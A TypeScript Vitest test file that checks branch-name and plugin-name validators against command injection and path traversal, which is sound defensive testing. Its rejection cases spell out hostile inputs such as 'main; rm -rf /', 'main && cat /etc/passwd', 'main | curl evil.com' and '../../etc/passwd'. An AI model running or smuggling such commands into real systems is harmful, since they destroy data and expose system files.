import { describe, it, expect } from "vitest";
import { isValidBranchName, isValidPluginName } from "../../src/utils/security.js";

describe("Command Injection Protection", () => {
  describe("Branch Name Validation", () => {
    it("should accept valid branch names", () => {
      expect(isValidBranchName("main")).toBe(true);
      expect(isValidBranchName("feature/new-feature")).toBe(true);
      expect(isValidBranchName("hotfix/bug-123")).toBe(true);
      expect(isValidBranchName("release/v1.0.0")).toBe(true);
      expect(isValidBranchName("user_name/feature")).toBe(true);
    });

    it("should reject branch names with command injection attempts", () => {
      expect(isValidBranchName("main; rm -rf /")).toBe(false);
      expect(isValidBranchName("main && cat /etc/passwd")).toBe(false);
      expect(isValidBranchName("main | curl evil.com")).toBe(false);
      expect(isValidBranchName("main$(whoami)")).toBe(false);
      expect(isValidBranchName("main`id`")).toBe(false);
    });

    it("should reject branch names with path traversal", () => {
      expect(isValidBranchName("../../etc/passwd")).toBe(false);
      expect(isValidBranchName("main/../../../root")).toBe(false);
    });

    it("should reject branch names starting with dash", () => {
      expect(isValidBranchName("-rf")).toBe(false);
      expect(isValidBranchName("--help")).toBe(false);
    });

    it("should reject empty or invalid input", () => {
      expect(isValidBranchName("")).toBe(false);
      expect(isValidBranchName(" ")).toBe(false);
      expect(isValidBranchName(null as any)).toBe(false);
      expect(isValidBranchName(undefined as any)).toBe(false);
    });
  });

  describe("Plugin Name Validation", () => {
    it("should accept valid plugin names", () => {
      expect(isValidPluginName("roast-plugin-graphql")).toBe(true);
      expect(isValidPluginName("roast-plugin-docker")).toBe(true);
      expect(isValidPluginName("@company/roast-plugin-internal")).toBe(true);
      expect(isValidPluginName("@myorg/roast-plugin-custom")).toBe(true);
    });

    it("should reject non-roast-plugin packages", () => {
      expect(isValidPluginName("lodash")).toBe(false);
      expect(isValidPluginName("express")).toBe(false);
      expect(isValidPluginName("@types/node")).toBe(false);
    });

    it("should reject path traversal attempts", () => {
      expect(isValidPluginName("../../../../etc/passwd")).toBe(false);
      expect(isValidPluginName("../../../malicious")).toBe(false);
      expect(isValidPluginName("roast-plugin-../../evil")).toBe(false);
    });

    it("should reject invalid scoped packages", () => {
      expect(isValidPluginName("@/roast-plugin-invalid")).toBe(false);
      expect(isValidPluginName("@company/not-a-roast-plugin")).toBe(false);
    });

    it("should reject empty or invalid input", () => {
      expect(isValidPluginName("")).toBe(false);
      expect(isValidPluginName(" ")).toBe(false);
      expect(isValidPluginName(null as any)).toBe(false);
      expect(isValidPluginName(undefined as any)).toBe(false);
    });
  });
});
